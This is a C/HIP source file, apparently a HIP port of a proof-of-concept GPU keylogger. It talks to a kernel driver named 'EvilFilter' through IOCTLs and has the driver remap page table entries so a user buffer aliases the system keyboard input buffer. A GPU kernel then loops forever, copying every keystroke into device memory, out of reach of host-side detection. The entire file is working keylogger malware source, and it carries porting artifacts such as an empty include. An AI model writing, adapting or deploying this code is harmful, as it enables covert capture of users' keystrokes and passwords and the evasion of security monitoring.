#include "hip/hip_runtime.h"
#include "stdafx.h"
#include <SharedHeader.h>
#include <stdio.h>
#include <kernelspecs.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <io.h>
#include <windows.h>
#include <winbase.h>
#include <hip/hip_runtime.h>
#include <hip/hip_runtime.h>
#include "hip/hip_runtime_api.h"
#include ""
#include <DbgEng.h>
#include <process.h>
#include <psapi.h>

#define DEBUG 1

__global__ void logKeyboardData(PKEYBOARD_INPUT_DATA keyboardData, PCHAR KeyMap, PCHAR cudaBuffer) { // , PCHAR KeyMap
	USHORT lastMakeCode = 0;
	ULONG bufferPosition = 0;
	int index = blockIdx.x*blockDim.x + threadIdx.x;
	if (index == 0) {
		while (TRUE) {
			if (lastMakeCode != keyboardData->MakeCode) { // keyboardData->MakeCode != 0
				cudaBuffer[bufferPosition++] = KeyMap[keyboardData->MakeCode];
#ifdef DEBUG
				printf(" %s SC:[0x%x] [%c] unit[0x%x] flags[0x%x] res[0x%x] ext[0x%lx]",
					keyboardData->Flags == KEY_BREAK ? "Up  " : keyboardData->Flags == KEY_MAKE ? "Down" : "Unkn",
					keyboardData->MakeCode,
					KeyMap[keyboardData->MakeCode],
					keyboardData->UnitId,
					keyboardData->Flags,
					keyboardData->Reserved,
					keyboardData->ExtraInformation);
				printf(" raw:");
				PCHAR p = (PCHAR)keyboardData;
				for (int i = 0; i < 12; i++) {
					printf("[0x%x]", p[i]);

				}
				printf("\n");
#endif
				lastMakeCode = keyboardData->MakeCode;
			}
		}
	}
}

/**
 * The overall strategy here is to make 2 calls to the driver obkect 
 * - the first is to get the offset for the pointer to the keyboard buffer
 * Then I loop through allocating variables until I get one with the correct 
 * offset.  
 * - the second call is with the pointer that has an identical offset
 * so that the driver can remap its page to the page with the keyboard buffer
 * 
 * once I have the maspped pointer I pass it to the CUDA routine so that it can begin monitoring it
 */
int main(int argc, _TCHAR* argv[]) {
#define IOCTL_CUSTOM_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)
	HANDLE hControlDevice;
	ULONG  bytes;

	hControlDevice = CreateFile(TEXT("\\\\.\\EvilFilter"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (INVALID_HANDLE_VALUE == hControlDevice) {
		printf("Failed to open EvilFilter device\n");
	}
	else {

		PKEYBOARD_INPUT_DATA keyboardData;
		PKEYBOARD_INPUT_DATA cudaKeyboardData;
		PSHARED_MEMORY_STRUCT dataToTransmit;

		keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
		dataToTransmit = (PSHARED_MEMORY_STRUCT)malloc(SharedMemoryLength);
		dataToTransmit->instruction = 'O';
		dataToTransmit->offset = 0;

		// Get the Buffer Offset
		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL)) {
			printf("Ioctl to EvilFilter device (attempt to get offset) failed\n");
		}
		else {
			ULONG kmdfOffset;
			ULONG keyboardOffset;
			PVOID ppde;
			PVOID ppte;
			PLLIST listNode;

			kmdfOffset = dataToTransmit->offset;
			keyboardOffset = (ULONG)keyboardData & 0x0fff;
			printf("Ioctl to EvilFilter device succeeded...offsets are [0x%lx] [0x%lx]\n", kmdfOffset, keyboardOffset);
			keyboardOffset = (ULONG)keyboardData & 0x0fff;
			printf("keyboardData is [0x%lx] offset is [0x%lx].\n", keyboardData, keyboardOffset);

			// create a pointer with the correct offset
			listNode = (PLLIST)malloc(sizeof(LLIST));
			listNode->keyboardBuffer = keyboardData;
			listNode->previous = NULL;
			while (keyboardOffset != kmdfOffset) {
				keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
				keyboardOffset = (ULONG)keyboardData & 0x0fff;
				PLLIST previousListNode = listNode;
				listNode = (PLLIST)malloc(sizeof(LLIST));
				listNode->keyboardBuffer = keyboardData;
				listNode->previous = previousListNode;
			}

			printf("keyboardData is [0x%lx] - freeing unused memory...\n", keyboardData);
			while (listNode != NULL) {
				PLLIST currentListNode = listNode;
				listNode = listNode->previous;
				if (currentListNode->keyboardBuffer != keyboardData) {
					free(currentListNode->keyboardBuffer);
				}
				free(currentListNode);
			}
			ppde = GetPdeAddress(keyboardData);
			ppte = GetPteAddress(keyboardData);
			printf("Page Directory is [0x%lx] Page Table is [0x%lx]\n", ppde, ppte);

			dataToTransmit->ClientMemory = keyboardData;
			dataToTransmit->PageDirectory = ppde;
			dataToTransmit->PageTable = ppte;
			dataToTransmit->instruction = 'E';

			// Get the Keyboard Buffer
			if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL )) {
				printf("Ioctl to EvilFilter device failed - unable to remap PTE\n");
			}
			else {
				PCHAR cudaKeyMap;
				PCHAR cudaBuffer;

				printf("Ioctl to EvilFilter device succeeded \n");
				printf("keyboardData=[0x%lx]\n", keyboardData);
				printf(" we now have the real keyboard buffer!!!\n");
				//send address to GPU

				checkCudaErrors(hipSetDevice(0));
				checkCudaErrors(hipSetDeviceFlags(hipDeviceMapHost));


				printf("Allocating cudaKeyMap...\n");
				checkCudaErrors(hipMalloc(&cudaBuffer, 1000000000));
				printf("Allocating cudaKeyMap...\n");
				checkCudaErrors(hipMalloc((void **)&cudaKeyMap, sizeof(char) * 84));
				printf("Copying KeyMap to cudaKeyMap...");
				checkCudaErrors(hipMemcpy(cudaKeyMap, KeyMap, 84 * sizeof(char), hipMemcpyHostToDevice));	printf("coppied.\n");

				printf("Registering KeyboardData for use by CUDA...\n");
				checkCudaErrors(hipHostRegister(keyboardData, 10 * sizeof(char), hipHostRegisterMapped));
				printf("getting device pointer for KeyboardData...\n");
				checkCudaErrors(hipHostGetDevicePointer((void **)&cudaKeyboardData, (void *)keyboardData, 0));

				printf("Launching CUDA process...");
				dim3 grid(1);
				dim3 block(1); 
				logKeyboardData <<<grid, block >>>(cudaKeyboardData, cudaKeyMap, cudaBuffer);
				checkCudaErrors(hipDeviceSynchronize());
				printf("Launched.\n");
			}
		}
		CloseHandle(hControlDevice);
	}
	printf("fin.\n");
	return 0;
}


PVOID GetPdeAddress(PVOID virtualaddr) {
	//ULONG pageDirectoryIndex = (ULONG)virtualaddr >> 21;
	ULONG pageDirectoryIndex = (ULONG)virtualaddr >> 22;
	printf("\n\nVirtualAddress [0x%lx] pageDirectoryIndex is [0x%lx]\n", virtualaddr, pageDirectoryIndex);
	PVOID pageDirectory = (PVOID)(PROCESS_PAGE_DIRECTORY_BASE + (pageDirectoryIndex * PTE_SIZE));
	printf("pageDirectoryTable   [0x%lx] ", pageDirectory);
	if ((pageDirectory)) {
		return pageDirectory;
	}
	else {
		printf(" is INVALID\n");
		return NULL;
	}
}

PVOID GetPteAddress(PVOID virtualaddr) {
	//ULONG pageDirectoryIndex = (ULONG)virtualaddr >> 21;
	//ULONG pageTableIndex = (ULONG)virtualaddr >> 12 & 0x01FF;
	ULONG pageDirectoryIndex = (ULONG)virtualaddr >> 22;
	ULONG pageTableIndex = (ULONG)virtualaddr >> 12 & 0x03FF;
	PVOID pageTable = (PVOID)(PROCESS_PAGE_TABLE_BASE + (pageTableIndex * PTE_SIZE) + (PAGE_SIZE * pageDirectoryIndex));
	printf("pageTable   [0x%lx] \n", pageTable);
	if ((pageTable)) {
		return pageTable;
	}
	else {
		printf(" is INVALID\n");
		return NULL;
	}
}

